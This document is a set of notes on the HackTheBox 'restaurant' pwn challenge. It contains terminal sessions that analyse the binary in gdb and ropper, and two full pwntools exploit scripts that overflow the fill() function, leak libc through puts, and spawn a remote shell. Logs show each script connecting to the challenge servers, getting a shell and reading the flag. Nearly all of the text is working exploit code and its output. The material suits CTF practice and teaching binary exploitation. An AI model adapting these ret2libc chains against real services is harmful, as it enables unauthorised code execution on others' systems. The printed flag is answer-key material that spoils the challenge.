┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ file restaurant 
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped
                                                                                                                                               
┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ checksec restaurant 
[*] '/home/kali/htb/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ strings restaurant        
/lib64/ld-linux-x86-64.so.2
libc.so.6
exit
__isoc99_scanf
puts
stdin
printf
strlen
read
stdout
alarm
setvbuf
strcmp
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
__gmon_start__
H=P `
/w#H
/w#H
AWAVI
AUATL
[]A\A]A^A_
[1;%d;%s%c
[1;%s%c
green
yellow
blue
magenta
cyan
rainbow
Unknown color!
underline
blink
bold
background
hidden
deleted
[1;%d;%s%s
[1;%s%s
You can add these ingredients to your dish:
You can also order something else.
Enjoy your %s
What beverage would you like?
1. Water.
Invalid option
Enjoy your drink!
 Welcome to Rocky Restaurant 
What would you like?
1. Fill my dish.
2. Drink something
Invalid option! Exiting..
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
restaurant.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
alarm@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
rainbow
fill
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
color
__libc_csu_init
reset
_dl_relocate_static_pie
__bss_start
main
setvbuf@@GLIBC_2.2.5
color_arr
check
__isoc99_scanf@@GLIBC_2.7
exit@@GLIBC_2.2.5
__TMC_END__
drink
setup
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.data
.bss
.comment

┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ gdb -q restaurant 
Reading symbols from restaurant...
(No debugging symbols found in restaurant)
gdb-peda$ checksec
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
gdb-peda$ pattern
pattern         pattern_arg     pattern_create  pattern_env     pattern_offset  pattern_patch   pattern_search  
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/kali/htb/pwn_restaurant/restaurant 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
🥡 Welcome to Rocky Restaurant 🥡
                                                                                                                                               
What would you like?                                                                                                                           
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:                                                                                                    
1. 🍅
2. 🧀
You can also order something else.
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA                                                                                           

Enjoy your AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x3f ('?')
RBX: 0x7fffffffdf08 --> 0x7fffffffe255 ("/home/kali/htb/pwn_restaurant/restaurant")
RCX: 0x0 
RDX: 0x0 
RSI: 0x7fffffffbc90 ("\nEnjoy your AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\nh.\n2. Drink something\n> ")
RDI: 0x7fffffffbb70 --> 0x7ffff7e1ee70 (<__funlockfile>:        mov    rdi,QWORD PTR [rdi+0x88])
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffddd8 ("AA0AAFAAbA\n")
RIP: 0x400eec (<fill+162>:      ret)
R8 : 0x0 
R9 : 0x73 ('s')
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffdf18 --> 0x7fffffffe27e ("COLORFGBG=15;0")
R14: 0x0 
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ee5 <fill+155>: call   0x400670 <printf@plt>
   0x400eea <fill+160>: nop
   0x400eeb <fill+161>: leave
=> 0x400eec <fill+162>: ret
   0x400eed <drink>:    push   rbp
   0x400eee <drink+1>:  mov    rbp,rsp
   0x400ef1 <drink+4>:  sub    rsp,0x10
   0x400ef5 <drink+8>:  mov    DWORD PTR [rbp-0x4],0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddd8 ("AA0AAFAAbA\n")
0008| 0x7fffffffdde0 --> 0xa4162 ('bA\n')
0016| 0x7fffffffdde8 --> 0x100000000 
0024| 0x7fffffffddf0 --> 0x1 
0032| 0x7fffffffddf8 --> 0x7ffff7df418a (<__libc_start_call_main+122>:  mov    edi,eax)
0040| 0x7fffffffde00 --> 0x0 
0048| 0x7fffffffde08 --> 0x400f68 (<main>:      push   rbp)
0056| 0x7fffffffde10 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400eec in fill ()
gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~12
Pattern buffer found at:https://shakuganz.com/2021/06/07/return-oriented-programming-rop-gnu-linux-version/
0x00007fffffffbc9c : offset    0 - size   50 ($sp + -0x213c [-2127 dwords])
0x00007fffffffddb0 : offset    0 - size   50 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb720 : 0x00007fffffffddb0 ($sp + -0x26b8 [-2478 dwords])
0x00007fffffffdcd8 : 0x00007fffffffddb0 ($sp + -0x100 [-64 dwords])
0x00007fffffffdcf8 : 0x00007fffffffddb0 ($sp + -0xe0 [-56 dwords])
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff7e19330 <__libc_system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0x7ffff7f63031 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ 

┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ ropper --file restaurant --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: restaurant
0x00000000004010a3: pop rdi; ret; 

    Craft ROP exploit to leak any library function’s address
    Find the libc version used (We can ignore this for this challenge since the libc is given)
    Calculate and set the ASLR base address of libc in the server
    Craft ROP exploit to system call Bash

$cat restaurant.py
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

# create ELF object of the challenge's files we want to exploit
elf = ELF("./restaurant")
# libc = ELF("./libc.so.6")

# offset before hitting the return address
overflow = b'A' * 40

# connect to server
r = remote("139.59.189.14",31051)
# once reach ">" then we choose the 1st option to go the the vulnerable page
r.sendlineafter("> ", "1")
# rop_elf.call(elf.plt['puts'], [next(elf.search(b""))])
# setting up ROP to print/leak ASLR address of puts() in the libc of the server (bypass ASLR)
rop_elf = ROP(elf)
# to print the leaked address in a new line
rop_elf.call(elf.plt['puts'], [next(elf.search(b""))])
# puts() will be called and print the address stored in elf.got['puts']
rop_elf.call(elf.plt['puts'], [elf.got['puts']])
# for stack alignment since end of it must align to 16 bytes so add this additional call to make it just nice 16 bytes. Use print(rop_elf.dump()) to see the alignment, aligned to 16 bytes which the start of Ubuntu 18 requires 
rop_elf.call((rop_elf.find_gadget(["ret"]))[0])
# Goes back to fill() so that we can setup our next ROP.
rop_elf.call(elf.symbols['fill']) #function fill() in restauranet is vuln

# combine into usable payload
rop_get_libc_aslr_addr = overflow + rop_elf.chain()
# see the alignment of the ROP exploit
log.info(rop_elf.dump())
# exploit the vulnerability to print out the ASLR address of puts() in libc in the server
r.sendlineafter(">", rop_get_libc_aslr_addr)
# ignore the empty space printed to us
r.recvuntil("\n")
# need to ignore the first line statement printed to use as is by the program to tell us "Enjoy your <input value>" before reaching RET
r.recvuntil("\n")
# get the leaked address of ASLR puts() in libc in the server
leaked_addr_puts_libc = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))

libc = ELF("./libc.so.6")
# elf_libc.symbols['puts'] gives us the offset to it instead of the relative address of puts()'s location in local's libc
server_libc_base_addr = leaked_addr_puts_libc - libc.symbols['puts']
log.info("Leaked server's libc address, puts(): " + hex(server_libc_base_addr))

libc.address = server_libc_base_addr

# Craft sys call to /bin/sh.
rop_libc = ROP(libc)
# for stack alignment since end of it must align to 16 bytes so add this additional call to make it just nice 16 bytes. Use print(rop_libc.dump()) to see the alignment
rop_libc.call((rop_libc.find_gadget(["ret"]))[0])
rop_libc.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])

# combine into usable payload
rop_get_bash_exploit = overflow + rop_libc.chain()
log.info(rop_libc.dump())

# exploit the vulnerability to print out the ASLR address of puts() in libc in the server
r.sendlineafter(">" ,rop_get_bash_exploit)

r.interactive()

'''
┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ ./resto_2.py 
[*] '/home/kali/htb/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/kali/htb/pwn_restaurant/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 139.59.189.14 on port 31051: Done
/home/kali/htb/pwn_restaurant/./resto_2.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("> ", "1")
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Loaded 14 cached gadgets for './restaurant'
[*] 0x0000:         0x4010a3 pop rdi; ret
    0x0008:         0x400040 [arg0] rdi = 4194368
    0x0010:         0x400650
    0x0018:         0x4010a3 pop rdi; ret
    0x0020:         0x601fa8 [arg0] rdi = got.puts
    0x0028:         0x400650
    0x0030:         0x40063e 0x40063e()
    0x0038:         0x400e4a 0x400e4a()
/home/kali/htb/pwn_restaurant/./resto_2.py:36: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("\n")
/home/kali/htb/pwn_restaurant/./resto_2.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("\n")
/home/kali/htb/pwn_restaurant/./resto_2.py:40: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  leaked_addr_puts_libc = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))
[*] Leaked server's libc address, puts(): 0x7f75b5e38000
[*] Loading gadgets for '/home/kali/htb/pwn_restaurant/libc.so.6'
[*] 0x0000:   0x7f75b5e388aa 0x7f75b5e388aa()
    0x0008:   0x7f75b5e595bf pop rdi; ret
    0x0010:   0x7f75b5febe1a [arg0] rdi = 140143541272090
    0x0018:   0x7f75b5e87550
[*] Switching to interactive mode
 
Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaa\x88\xe3\xbid
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls -la
total 2016
drwxr-xr-x 1 root ctf     4096 Feb 23  2021 .
drwxr-xr-x 1 root root    4096 Jan 22  2021 ..
-r--r----- 1 root ctf       29 Feb 23  2021 flag.txt
-rwxr-xr-x 1 root ctf  2030928 Feb 23  2021 libc.so.6
-rwxr-x--- 1 root ctf    12952 Feb 23  2021 restaurant
-rwxr-x--- 1 root ctf       41 Feb 23  2021 run_challenge.sh
$ cat flag.txt
HTB{r3turn_2_th3_r3st4ur4nt!}$  
'''


https://libc.blukat.me/	
https://rehex.ninja/posts/ret2libc/	
https://shakuganz.com/2021/06/04/hackthebox-restaurant-write-up/
https://fdlucifer.github.io/2021/05/08/pwn-restaurant/
https://shakuganz.com/2021/06/07/return-oriented-programming-rop-gnu-linux-version/

#!/usr/bin/env python
# please use python2.7

from pwn import *
import argparse

main = 0x0000000000400F68
prdi = 0x00000000004010a3
putsgot = 0x0000000000601FA8
puts = 0x0000000000400650
bss = 0x0000000000602800
fill = 0x0000000000400E4A
read = 0x0000000000400EBC

def exp():
    p.sendlineafter(b"> ", b"1")

    payload = b""
    payload += b"A"*0x20
    payload += p64(bss)
    payload += p64(prdi)
    payload += p64(putsgot)
    payload += p64(puts)
    payload += p64(main)

    p.sendafter(b"> ", payload)

    p.recvuntil(b"A"*0x20)

    puts_g = u64(p.recv(6) + b"\x00\x00")
    print("puts_g address:", hex(puts_g))
    libc = puts_g - 0x80aa0
    print("libc address:", hex(libc))
    oneshot = libc + 0x4f432
    print("oneshot address:", hex(oneshot))

    p.sendlineafter("> ", "1")

    payload2 = b""
    payload2 += b"B"*0x20
    payload2 += p64(bss)
    payload2 += p64(read)
    p.sendafter(b"> ", payload2)

    #p.recvuntil("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
    raw_input()
    payload3 = b"C"*0x28
    payload3 += p64(oneshot)

    p.send(payload3)
    print("[+] You Have Successfully Got The shell...")
    p.interactive()

if __name__ == '__main__' :
    context.arch = 'amd64'
    #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    p = remote("157.245.39.81",32200)
    exp()
'''
┌──(kali㉿kali)-[~/htb/pwn_restaurant]
└─$ ./resto_1.py
[+] Opening connection to 157.245.39.81 on port 32200: Done
puts_g address: 0x7f6ec939faa0
libc address: 0x7f6ec931f000
oneshot address: 0x7f6ec936e432
/home/kali/htb/pwn_restaurant/./resto_1.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter("> ", "1")
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
id
[+] You Have Successfully Got The shell...
[*] Switching to interactive mode

Enjoy your BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Enjoy your CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC2\xe46\xcid
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls -la
total 2016
drwxr-xr-x 1 root ctf     4096 Feb 23  2021 .
drwxr-xr-x 1 root root    4096 Jan 22  2021 ..
-r--r----- 1 root ctf       29 Feb 23  2021 flag.txt
-rwxr-xr-x 1 root ctf  2030928 Feb 23  2021 libc.so.6
-rwxr-x--- 1 root ctf    12952 Feb 23  2021 restaurant
-rwxr-x--- 1 root ctf       41 Feb 23  2021 run_challenge.sh
$ cat flag.txt
HTB{r3turn_2_th3_r3st4ur4nt!}$  
'''
